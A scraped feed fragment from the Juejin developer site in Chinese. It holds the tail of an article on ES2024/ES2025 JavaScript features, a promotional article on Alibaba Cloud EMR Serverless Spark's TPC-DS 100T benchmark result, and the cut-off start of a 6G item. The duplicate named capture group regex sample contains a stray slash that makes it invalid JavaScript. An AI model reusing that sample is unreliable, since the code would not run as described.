   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(invalidStr2.<span class="hljs-title function_">isWellFormed</span>()); <span class="hljs-comment">// false</span>

   <span class="hljs-comment">// 3. 格式良好的字符串：返回原字符串副本</span>
   <span class="hljs-keyword">const</span> validStr = <span class="hljs-string">'Hello 😀'</span>;
   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(validStr.<span class="hljs-title function_">toWellFormed</span>()); <span class="hljs-comment">// Hello 😀</span>
   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(validStr.<span class="hljs-title function_">toWellFormed</span>() === validStr); <span class="hljs-comment">// true（内容相同，引用不同）</span>

   <span class="hljs-comment">// 4. 格式不良的字符串：替换未配对代理项为 �</span>
   <span class="hljs-keyword">const</span> invalidStr1 = <span class="hljs-string">'\uD83D'</span>; <span class="hljs-comment">// 单独高代理项</span>
   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(invalidStr1.<span class="hljs-title function_">toWellFormed</span>()); <span class="hljs-comment">// �</span>
</code></pre>
<hr/>
<h2 data-id="heading-31">ES2025</h2>
<h3 data-id="heading-32">迭代器助手方法（Iterator Helpers）</h3>
<p>引入 Iterator 全局对象及其原型方法，支持对任何可迭代对象（如 Array、Set、Map）进行函数式操作，如 map、filter 等。这些方法返回新的迭代器，支持惰性求值。</p>
<ul>
<li>
<p><strong>语法</strong>：Iterator.from(iterable).method(callback)</p>
<ul>
<li>支持方法：map()、filter()、reduce()、take()、drop()、flatMap()、toArray()、forEach() 等。</li>
</ul>
</li>
<li>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>];
<span class="hljs-keyword">const</span> evenSquares = <span class="hljs-title class_">Iterator</span>.<span class="hljs-title function_">from</span>(arr)
  .<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>)
  .<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x ** <span class="hljs-number">2</span>)
  .<span class="hljs-title function_">toArray</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(evenSquares); <span class="hljs-comment">// [4, 16]</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-33">Set新增方法</h3>
<p>为 Set.prototype 添加数学集合操作方法，支持集合的并集、交集、差集等。</p>
<ul>
<li>
<p><strong>新增方法</strong>：</p>
<ul>
<li>set.union(other) 并集</li>
<li>set.intersection(other) 交集</li>
<li>set.difference(other) 差集</li>
<li>set.symmetricDifference(other) 对称差集（并集减交集）</li>
<li>set.isSubsetOf(other) 子集</li>
<li>set.isSupersetOf(other) 超集</li>
<li>set.isDisjointFrom(other) 不相交</li>
</ul>
</li>
<li>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> setA = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]);
<span class="hljs-keyword">const</span> setB = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(setA.<span class="hljs-title function_">union</span>(setB)); <span class="hljs-comment">// Set {1, 2, 3, 4}</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(setA.<span class="hljs-title function_">intersection</span>(setB)); <span class="hljs-comment">// Set {2, 3}</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(setA.<span class="hljs-title function_">isSubsetOf</span>(setB)); <span class="hljs-comment">// false</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-34">直接导入JSON 模块</h3>
<p>引入导入属性（with 关键字），支持直接导入 JSON 文件作为模块。</p>
<ul>
<li>
<p><strong>语法</strong>：import json from "./data.json" with { type: "json" };</p>
</li>
<li>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> data <span class="hljs-keyword">from</span> <span class="hljs-string">"./config.json"</span> <span class="hljs-keyword">with</span> { <span class="hljs-attr">type</span>: <span class="hljs-string">"json"</span> };
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data); <span class="hljs-comment">// { key: "value" }</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-35">Promise.try()</h3>
<p>一个新的静态方法，用于包装函数调用，确保返回 Promise，无论函数是否异步或抛出错误。</p>
<ul>
<li>
<p><strong>语法</strong>：Promise.try(callback)</p>
</li>
<li>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() &gt; <span class="hljs-number">0.5</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Fail'</span>);
  <span class="hljs-keyword">return</span> <span class="hljs-string">'Success'</span>;
})
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">result</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result))
  .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error));
</code></pre>
</li>
</ul>
<h3 data-id="heading-36">新增Float16Array</h3>
<p>引入 Float16Array 类型数组，支持 16 位浮点数，以及 DataView 的 getFloat16/setFloat16 和 Math.f16round()。</p>
<h3 data-id="heading-37"><strong>RegExp.escape() 方法</strong></h3>
<p>一个静态方法，用于转义字符串，使其可安全用于正则表达式。</p>
<ul>
<li>
<p><strong>语法</strong>：RegExp.escape(str)</p>
</li>
<li>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> userInput = <span class="hljs-string">'a.b*c?'</span>;
<span class="hljs-keyword">const</span> regex = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-title class_">RegExp</span>.<span class="hljs-built_in">escape</span>(userInput), <span class="hljs-string">'g'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'a.b*c?'</span>.<span class="hljs-title function_">replace</span>(regex, <span class="hljs-string">'replaced'</span>)); <span class="hljs-comment">// 'replaced'</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-38">正则表达式内联标志</h3>
<ul>
<li>
<p><strong>语法</strong>：/(?i:case-insensitive)/</p>
</li>
<li>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> regex = <span class="hljs-regexp">/(?i:hello)/</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(regex.<span class="hljs-title function_">test</span>(<span class="hljs-string">'HELLO'</span>)); <span class="hljs-comment">// true（忽略大小写）</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-39">正则表达式重复命名捕获组</h3>
<p>允许在正则表达式中重复使用相同的命名捕获组名称。</p>
<ul>
<li>
<p><strong>语法</strong>：/(?&lt;group&gt;a)|(?&lt;group&gt;b)/</p>
</li>
<li>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> regex = <span class="hljs-regexp">/(?&lt;year&gt;\d{4})-(?&lt;month&gt;\d{2})|(?&lt;year&gt;\d{4})/</span>(?&lt;month&gt;\d{<span class="hljs-number">2</span>})/;
<span class="hljs-keyword">const</span> match = <span class="hljs-string">'2025-07'</span>.<span class="hljs-title function_">match</span>(regex);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(match.<span class="hljs-property">groups</span>.<span class="hljs-property">year</span>); <span class="hljs-comment">// '2025'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(match.<span class="hljs-property">groups</span>.<span class="hljs-property">month</span>); <span class="hljs-comment">// '07'</span>
</code></pre>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[阿里云 EMR Serverless Spark TPC-DS 100T 榜首背后的内核技术]]></title>    <link>https://juejin.cn/post/7605625595570569231</link>    <guid>https://juejin.cn/post/7605625595570569231</guid>    <pubDate>2026-02-13T02:58:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605625595570569231" data-draft-id="7605810996125040674" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="阿里云 EMR Serverless Spark TPC-DS 100T 榜首背后的内核技术"/> <meta itemprop="keywords" content="Spark"/> <meta itemprop="datePublished" content="2026-02-13T02:58:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="阿里云大数据AI技术"/> <meta itemprop="url" content="https://juejin.cn/user/2414974667341287"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            阿里云 EMR Serverless Spark TPC-DS 100T 榜首背后的内核技术
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2414974667341287/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    阿里云大数据AI技术
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T02:58:56.000Z" title="Fri Feb 13 2026 02:58:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>演讲者：一锤（周克勇）| EMR Serverless Spark 技术负责人</strong></p>
<p>2025年9月，阿里云EMR Serverless Spark 以QphDS超6568万分的性能结果成功登顶TPC-DS 100T榜单，这是全球大数据领域最具权威性和挑战性的性能测试基准。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3eb2cd73c7124e6a89fc9b0160f31bfc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771556335&amp;x-signature=HfRyscQ87tgbekZjyGJHbRlTa38%3D" alt="image (39).png" loading="lazy"/></p>
<p>阿里云EMR Serverless Spark TPC-DS 100T 性能测试结果</p>
<blockquote>
<p>TPC-DS Benchmark是数据仓库领域最新和最复杂的权威测试标准，被工业界和学术界广泛认可，也是数据仓库选型的重要参考指标。TPC-DS包含99个查询，从简单的全局聚合到复杂的20以上多表连接，体现了真实分析场景日益增长的复杂度。其中，100T是TPC-DS提供的最大测试数据集，最大表有288,017,344,252（2880亿）条数据，迄今为止只有阿里云EMR和Databricks成功通过了该榜单的官方评审。</p>
</blockquote>
<p>阿里云 EMR Serverless Spark实现了 <strong>性能提升100%</strong>、<strong>性价比提升500%</strong> 的突破，证明了EMR Serverless Spark 在 OpenLake湖仓底座架构下，超大规模、超高复杂度的数据分析、数据更新、数据处理的市场领先能力。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/756e5be154054086b51e6099ab1209cc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771556335&amp;x-signature=MNAR%2BIQHew0X9fCxwpoozlJQ%2FTs%3D" alt="image (40).png" loading="lazy"/></p>
<p>本文将深入剖析支撑这一成绩背后的技术内核，从产品定位、架构设计到核心优化策略，全面解读 EMR Serverless Spark 如何实现“高性能、低成本、高弹性、强兼容”的统一。</p>
<h2 data-id="heading-0">产品定位与核心场景</h2>
<p>EMR Serverless Spark 定位为新一代 <strong>Lakehouse（湖仓一体）平台</strong>，旨在融合传统数据仓库的极致查询性能与数据湖的低成本、开放性优势。</p>
<p>其核心聚焦三大场景：</p>
<ol>
<li>
<p><strong>湖仓分析场景</strong>：以高度优化的 Spark 替代 Hive 执行 ETL/ELT 任务，替代 Trino/Presto 提供高性价比交互式分析。支持 SQL、DataFrame、Pandas、RDD 等多种接口，并全面兼容 Paimon、Iceberg、Delta、Hudi 等主流湖表格式。</p>
</li>
<li>
<p><strong>机器学习场景</strong>：作为成熟的分布式 ML 框架，Spark 支持从数据清洗、特征工程到模型训练与批量推理的全流程。内置 MLlib，集成 XGBoost、LightGBM、scikit-learn 等生态工具，并提供 GPU 加速能力，实现 Data + AI 一体化。</p>
</li>
<li>
<p><strong>多模态数据处理场景</strong>：随着大模型兴起，PySpark 成为处理文本、图像、视频等非结构化数据的理想选择。产品推出的 <strong>AI Function</strong> 功能，允许用户在 Spark 作业中直接调用大模型。针对基模训练数据预处理做了专门优化，在文本去重任务中实现 <strong>5倍性能提升</strong>。</p>
</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e8c52ca3ea5c45d882ab093d2fff3cbf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771556335&amp;x-signature=MnMc9ThpBU2ygyxe%2BjSLddjizDU%3D" alt="image (41).png" loading="lazy"/></p>
<h2 data-id="heading-1">产品架构与极致弹性</h2>
<p>EMR Serverless Spark 采用标准 Lakehouse 架构：</p>
<ul>
<li>
<p><strong>存储层</strong>：基于阿里云 OSS 对象存储与 OSS-HDFS 接口，提供高吞吐、低成本的持久化能力；</p>
</li>
<li>
<p><strong>元数据层</strong>：兼容 Hive Metastore（HMS）与 Data Lake Formation（DLF），支持 ACID 事务；</p>
</li>
<li>
<p><strong>资源层</strong>：依托阿里云全 Region 的 ECS 资源池，实现近乎无限的弹性供给；</p>
</li>
<li>
<p><strong>引擎层</strong>：核心创新包括 <strong>Fusion 向量化执行引擎</strong> 与 <strong>Celeborn Remote Shuffle Service</strong>；</p>
</li>
<li>
<p><strong>产品层</strong>：提供认证鉴权、开发 IDE、资源监控、智能诊断等企业级功能。</p>
</li>
</ul>
<p><strong>极致弹性</strong> 是其关键竞争力：</p>
<ul>
<li>
<p>支持 <strong>进程级弹性</strong>，最小资源单位低至 1 Core；</p>
</li>
<li>
<p>容器启动时间 &lt;15 秒，会话模式、Standalone模式下实现“零冷启”；</p>
</li>
<li>
<p>采用 Workspace + 队列的双层 Quota 机制，满足多租户资源隔离需求；</p>
</li>
<li>
<p>实际客户案例显示，资源使用波动可从数万核骤降至零，Serverless 架构帮助客户 <strong>节省40%资源成本</strong>。</p>
</li>
</ul>
<p>此外，系统默认提供 <strong>跨可用区高可用</strong> 能力，Spark 控制面与 Celeborn 服务均多 AZ 部署，作业自动故障迁移，SLA 达 99.9%，且无额外费用。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/39f2773d1eb544b98c9de8cd882866d0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771556335&amp;x-signature=usLMeRPNtlKnAme5e4khinJ%2B8xE%3D" alt="image (42).png" loading="lazy"/>
EMR Serverless Spark 产品架构</p>
<h2 data-id="heading-2">全方位生态兼容</h2>
<p>EMR Serverless Spark 坚持 <strong>开放生态优先</strong> 的设计理念：</p>
<ul>
<li>
<p><strong>接口兼容</strong>：完整支持 spark-submit、spark-sql、beeline、JDBC 等经典方式，也集成 Kyuubi（含 HA）、Livy 等交互式查询服务；</p>
</li>
<li>
<p><strong>工具链集成</strong>：无缝对接 Jupyter、Zeppelin、Superset、DBT 等主流开发分析工具；</p>
</li>
<li>
<p><strong>调度系统</strong>：深度适配 Airflow、DolphinScheduler，并在阿里云生态内与 <strong>DataWorks 原生集成</strong>——作为DataWorks“一等公民”，支持 SQL 节点、Notebook、工作流编排、统一权限与数据血缘等；</p>
</li>
<li>
<p><strong>安全与元数据</strong>：支持 Kerberos、LDAP、Ranger；</p>
</li>
<li>
<p><strong>湖格式</strong>：湖格式覆盖 Paimon/Delta/Hudi/Iceberg；</p>
</li>
<li>
<p><strong>外部数据源</strong>：连接 StarRocks、Doris、Hologres、HBase、Elasticsearch、MongoDB、MaxCompute、MySQL 、Postgres等数十种系统。</p>
</li>
</ul>
<p>这种广泛的兼容性极大降低了用户迁移和集成成本，真正实现“开箱即用”。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fe380361dc7f44d0b724851716c1d60d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771556335&amp;x-signature=7KlCA7ly36yuFaicU2KuYe3jDZY%3D" alt="image (43).png" loading="lazy"/></p>
<h2 data-id="heading-3">TPC-DS 100T 背后的四大核心技术</h2>
<p>官方TPC-DS 100T 测试包含数据生成、导入、Power Test（单并发99查询）、Throughput Test（4并发396查询）、Maintenance Test（Upsert 操作）等环节，最终通过 QphDS 分数衡量综合性能。</p>
<p>阿里云的突破源于以下四大技术创新：</p>
<h3 data-id="heading-4">1. Fusion 向量化执行引擎</h3>
<p>自2019年起研发，Fusion 将 Spark 从行式计算升级为 <strong>列式向量化执行</strong>：</p>
<ul>
<li>
<p>利用 SIMD 指令并行处理多列数据；</p>
</li>
<li>
<p>连续内存布局显著提升 CPU Cache 命中率；</p>
</li>
<li>
<p>异步 IO 与 IO 合并优化读取效率；</p>
</li>
<li>
<p>关键算子（Sort/Window/Join）优化，性能提升达 <strong>300%</strong>。</p>
</li>
</ul>
<p>在 TPC-DS 场景中，Fusion 还引入 Subplan Reuse、Broadcast Join Reuse、Semi Join 哈希表去重等优化，大幅减少重复计算与内存占用。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd49b01f60be4d41883a36c4394313e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771556335&amp;x-signature=kgq71K1AOatomFS765KcJbv8F7k%3D" alt="image (44).png" loading="lazy"/></p>
<h3 data-id="heading-5">2. 与 Paimon 深度协同</h3>
<p>Fusion 与阿里自研湖表格式 Paimon 深度整合：</p>
<ul>
<li>
<p>向量化读写使读性能提升 <strong>70%</strong>，写性能提升 <strong>30%</strong>；</p>
</li>
<li>
<p>Variant 类型相比原始 JSON 提升 <strong>178%</strong>；</p>
</li>
<li>
<p>Shredding 技术进一步加速JSON解析，性能再提升 <strong>364%</strong>。</p>
</li>
</ul>
<h3 data-id="heading-6">3. Celeborn Remote Shuffle Service</h3>
<p>作为 Apache 顶级项目，Celeborn 采用 <strong>推送式 Shuffle 架构</strong>：</p>
<ul>
<li>
<p>在大规模作业中提供更高吞吐与更低延迟；</p>
</li>
<li>
<p>支持副本容错与Stage重算，保障作业稳定性；</p>
</li>
<li>
<p>大规模生产验证，成为业界事实标准。</p>
</li>
</ul>
<h3 data-id="heading-7">4. DLF 3.0 与优化器增强</h3>
<p>基于 Paimon 的 DLF 3.0 提供高性能 ACID 能力，满足 TPC-DS Maintenance 测试要求；同时优化器在 Join 顺序选择、代价模型等方面持续迭代，提升复杂查询效率。</p>
<p><strong>最终成果</strong>：在仅使用一半内存的情况下，QphDS 性能翻倍，性价比提升5倍，所有结果均通过 TPC 官方严格审计。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/821ba933c3794057ac132607e75d4cec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771556335&amp;x-signature=HWHB35XC60C%2FvVWBvFUFi4lu5Gk%3D" alt="image (45).png" loading="lazy"/></p>
<h2 data-id="heading-8">AI 时代的新功能：让 Spark 成为 AI 基础设施</h2>
<p>面对 AI 浪潮，EMR Serverless Spark 推出多项创新功能：</p>
<ul>
<li>
<p><strong>AI Function</strong>：内置 <code>ai_query</code>、<code>ai_sentiment</code>、<code>ai_classify</code>、<code>ai_embedding</code> 等函数，用户可在 SQL 中直接调用大模型，如同使用内置 UDF。支持接入百炼、OpenAI、PAI EAS 或本地 GPU 模型。</p>
</li>
<li>
<p><strong>Spark on GPU</strong>：提供弹性 GPU 实例，按需配置 CPU/GPU 混合机型，避免固定集群成本。支持：</p>
<ul>
<li>
<p>AI Function 本地 GPU 推理；</p>
</li>
<li>
<p>Spark ML（XGBoost/LightGBM）GPU 加速；</p>
</li>
<li>
<p>Spark SQL 向量化 GPU 计算。</p>
</li>
</ul>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ebcbab7c50a0438d9b920d0c8ded278e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771556335&amp;x-signature=%2Bx68PvNhZXNOGfPU3vQUOw2ZYNI%3D" alt="image (46).png" loading="lazy"/></p>
<ul>
<li>
<p><strong>即将上线功能</strong>：</p>
<ul>
<li>
<p><strong>Spark + Ray 双引擎融合</strong>：满足 Python 分布式与异构计算需求；</p>
</li>
<li>
<p><strong>DuckDB 集成</strong>：针对中小数据分析，在 Notebook 中已内置，未来支持直连 DLF 3.0；</p>
</li>
<li>
<p><strong>文本去重加速</strong>：在 FineWeb-edu（8TB、30亿文档）上，800 核仅需 72 分钟，提速 5 倍。</p>
</li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-9">携手客户共同成长</h2>
<p>EMR Serverless Spark 已在多家金融、互联网、智能硬件及零售企业的生产环境中稳定运行，广泛应用于数据仓库加速、实时风控、向量检索、机器学习等核心场景。</p>
<p>同时，Celeborn 社区也在多个头部互联网平台和科技企业中落地，支撑高并发、大规模的数据计算需求。</p>
<p>阿里云 EMR Serverless Spark 的 TPC-DS 登顶，不仅体现了优异性能，更体现了架构理念、工程能力和生态战略。在 Data + AI 融合的新时代，它正成为企业构建下一代智能数据基础设施的核心引擎。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[6G 物理层变天AFDM：与其在 OFDM 的死胡同里撞墙，不如换个坐标系“折叠”世界]]></title>    <link>https://juejin.cn/post/7605535884940492851</link>    <guid>https://juejin.cn/post/7605535884940492851</guid>    <pubDate>2026-02-12T13:07:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" 